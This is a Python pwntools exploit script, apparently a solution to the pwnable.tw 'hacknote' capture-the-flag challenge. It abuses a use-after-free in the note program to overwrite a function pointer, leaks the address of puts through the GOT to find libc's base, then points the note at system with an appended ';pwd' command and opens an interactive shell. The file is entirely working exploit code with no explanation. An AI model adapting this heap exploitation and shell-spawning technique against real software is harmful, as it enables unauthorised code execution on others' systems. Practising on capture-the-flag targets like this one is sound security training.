from pwn import *

BUF = 'AAAA'
PRINT_FROM_NEXT_BYTE_FUNC = p32(0x0804862B)
NOTE_AMOUNT = 2
libc = ELF('libc_32.so.6')
hacknote = ELF('hacknote')
PUTS_GOT_PLT_ADDR = p32(0x0804a024)


class Prompts:
    CHOICE = 'Your choice :'
    NOTE_SIZE = 'Note size :'
    CONTENT = 'Content :'
    INDEX = 'Index :'


class BinSizes:
    NOTE = '12'
    CONTENT = '40'


class Choices:
    ADD = '1'
    DELETE = '2'
    PRINT = '3'


class Note:
    def __init__(self, size: int, content: str):
        self.size = size
        self.content = content

    def __str__(self):
        return f'Note {{ size: {self.size}, content: {self.content} }}'


p = gdb.debug(hacknote.path, 'c', env=dict(LD_PRELOAD=libc.path))
# p = remote('chall.pwnable.tw', 10102)


def add_notes(notes: [Note]):
    for note in notes:
        print(f'[*] Adding: {note}')
        p.sendafter(Prompts.CHOICE, Choices.ADD)
        p.sendafter(Prompts.NOTE_SIZE, note.size)
        p.sendafter(Prompts.CONTENT, note.content)


def del_notes(note_indexes):
    print(f'[*] Deleting notes: {note_indexes}')
    for note_index in note_indexes:
        p.sendafter(Prompts.CHOICE, Choices.DELETE)
        p.sendafter(Prompts.INDEX, str(note_index))


def override_note_func(func_ptr):
    print("[*] Overriding note's function pointer.")
    p.sendafter(Prompts.CHOICE, Choices.ADD)
    p.sendafter(Prompts.NOTE_SIZE, BinSizes.NOTE)
    p.sendafter(Prompts.CONTENT, func_ptr)


def call_note_func():
    print("[*] Calling the overridden function.")
    p.sendafter(Prompts.CHOICE, Choices.PRINT)
    p.sendafter(Prompts.INDEX, '0')


def read_libc_base_address():
    print(f"[*] Leaking libc's base address.")
    libc_base = u32(p.readn(4)) - libc.symbols['puts']
    print(f"[*] libc's base address: {hex(libc_base)}")
    return libc_base


def main():
    add_notes([Note(BinSizes.CONTENT, BUF), Note(BinSizes.CONTENT, BUF)])
    del_notes(range(2))
    override_note_func(PRINT_FROM_NEXT_BYTE_FUNC + PUTS_GOT_PLT_ADDR)
    call_note_func()
    system_addr = read_libc_base_address() + libc.symbols['system']
    del_notes([2])
    override_note_func(p32(system_addr) + b';pwd')
    call_note_func()
    p.interactive()


if __name__ == "__main__":
    main()
